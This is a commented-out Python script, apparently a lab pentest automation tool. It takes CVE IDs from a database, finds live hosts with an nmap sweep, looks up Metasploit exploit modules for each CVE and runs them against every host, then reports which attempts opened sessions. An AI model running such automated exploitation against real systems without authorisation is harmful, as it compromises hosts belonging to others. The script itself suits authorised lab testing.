# import sqlite3
# import nmap
# from pymetasploit3.msfrpc import MsfRpcClient
# from prettytable import PrettyTable
# import ipaddress

# # CONFIGURATION
# DB_PATH = 'cves.db'  # Path to your CVE database
# MSF_PASSWORD = 'msf'  # Metasploit RPC password
# MSF_HOST = '127.0.0.1'
# MSF_PORT = 55553
# SUBNET = '192.168.56.101/24'  # Example VirtualBox Host-Only subnet
# REPORT_PATH = 'pentest_report.txt'

# # 1. Fetch CVEs from DB
# def fetch_cves():
#     conn = sqlite3.connect(DB_PATH)
#     cur = conn.cursor()
#     cur.execute('SELECT cve_id, description FROM cves')
#     cves = cur.fetchall()
#     conn.close()
#     return cves

# # 2. Map CVEs to exploits (dummy mapping for demo)
# def map_cve_to_exploit(client, cve_id):
#     # Dynamically search Metasploit modules for this CVE
#     try:
#         results = client.modules.search(cve_id)
#         for module in results:
#             if module.get('type') == 'exploit':
#                 return module.get('fullname')
#     except Exception as e:
#         print(f"[!] Error searching for exploit for {cve_id}: {e}")
#     return None

# # 3. Scan subnet for live hosts
# def scan_subnet(subnet):
#     nm = nmap.PortScanner()
#     nm.scan(hosts=subnet, arguments='-sn')
#     hosts = [h for h in nm.all_hosts() if nm[h].state() == 'up']
#     return hosts

# # 4. Run exploit using Metasploit RPC
# def run_exploit(client, exploit, rhost):
#     try:
#         exploit_mod = client.modules.use('exploit', exploit)
#         # Only run exploits that support RHOSTS (network-based)
#         if 'RHOSTS' not in exploit_mod.options:
#             print(f"[!] Skipping exploit {exploit}: does not support RHOSTS (not network-based).")
#             return False
#         exploit_mod['RHOSTS'] = rhost
#         payloads = exploit_mod.targetpayloads()
#         if not payloads:
#             return False
#         payload = payloads[0]
#         exploit_mod.execute(payload=payload)
#         import time
#         time.sleep(5)
#         sessions = client.sessions.list
#         return len(sessions) > 0
#     except Exception as e:
#         print(f"[!] Error running exploit {exploit} on {rhost}: {e}")
#         return False

# # 5. Main pentest logic
# def pentest():
#     cves = fetch_cves()
#     hosts = scan_subnet(SUBNET)
#     client = MsfRpcClient(MSF_PASSWORD, server=MSF_HOST, port=MSF_PORT)
#     results = []
#     print(f"Found {len(cves)} CVEs in database.")
#     print(f"Found {len(hosts)} live hosts in subnet.")
#     for cve_id, desc in cves:
#         exploit = map_cve_to_exploit(client, cve_id)
#         if not exploit:
#             print(f"No exploit found for {cve_id}")
#             continue
#         for host in hosts:
#             print(f"Running exploit {exploit} for {cve_id} on {host}")
#             success = run_exploit(client, exploit, host)
#             if success:
#                 print(f"Exploit {exploit} for {cve_id} on {host} succeeded.")
#             else:
#                 print(f"Exploit {exploit} for {cve_id} on {host} failed.")
#             results.append((host, cve_id, exploit, 'Success' if success else 'Fail'))
#     generate_report(results)

# # 6. Generate report
# def generate_report(results):
#     table = PrettyTable(['Host', 'CVE', 'Exploit', 'Result'])
#     for row in results:
#         table.add_row(row)
#     with open(REPORT_PATH, 'w') as f:
#         f.write(str(table))
#     print(f'Report generated at {REPORT_PATH}')

# if __name__ == '__main__':
#     pentest()